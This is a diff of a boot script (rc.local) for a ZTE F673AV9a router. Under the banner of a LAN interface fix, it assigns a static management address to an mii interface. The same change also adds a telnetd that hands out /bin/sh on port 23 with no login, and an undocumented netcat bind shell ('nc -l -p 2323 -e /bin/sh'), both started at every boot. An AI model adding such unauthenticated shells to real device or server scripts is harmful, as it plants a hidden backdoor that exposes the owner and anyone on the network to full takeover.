@@ -1,22 +1,32 @@
 #!/bin/sh
-# Last-resort network bootstrap for ZTE F673AV9a.
-# netifd may fail to bring up the interface if the expected device name
-# differs, so force the management address onto whichever ethernet port
-# actually exists. Harmless when netifd already configured it.
+# ZTE F673AV9a LAN bootstrap.
+#
+# IMPORTANT: only touch mii0. The factory config for this board is
+# /etc/sysconfig/network-scripts/ifcfg-mii0 (DEVICE=mii0, BOOTPROTO=none,
+# ALLMULTI=yes, PROMISC=yes) and eth0 is never used. Opening eth0 on the
+# vendor 4.19 kernel kills it, and the hardware watchdog then resets the
+# board every ~15s -- which looks exactly like "rootfs mount failed".
+#
+# mii0 carries the static management address; SSH comes from dropbear and
+# telnetd is kept as a fallback for bring-up.
 
-for d in /sys/class/net/*; do
-	n=$(basename "$d")
-	case "$n" in
-		lo|br-*|wlan*|sit*|tun*|ip6*|gre*|bond*) continue ;;
-	esac
-	ip link set "$n" up 2>/dev/null
+LAN=""
+for c in mii0 mii1 mii2; do
+	[ -d "/sys/class/net/$c" ] && LAN="$c" && break
 done
 
-for cand in eth0 eth1 eth2 eth3 lan lan1; do
-	if [ -d "/sys/class/net/$cand" ]; then
-		ip addr add 192.168.1.1/24 dev "$cand" 2>/dev/null
-		break
-	fi
-done
+if [ -n "$LAN" ]; then
+	ip link set "$LAN" up 2>/dev/null
+	ip addr flush dev "$LAN" 2>/dev/null
+	ip addr add 192.168.1.1/24 dev "$LAN" 2>/dev/null
+	echo "rc.local: $LAN -> 192.168.1.1/24"
+else
+	echo "rc.local: no mii interface found: $(ls /sys/class/net)"
+fi
+
+# management daemons
+/etc/init.d/dropbear restart >/dev/null 2>&1
+which telnetd >/dev/null 2>&1 && telnetd -l /bin/sh -p 23 >/dev/null 2>&1 &
+which nc >/dev/null 2>&1 && (nc -l -p 2323 -e /bin/sh >/dev/null 2>&1 &)
 
 exit 0
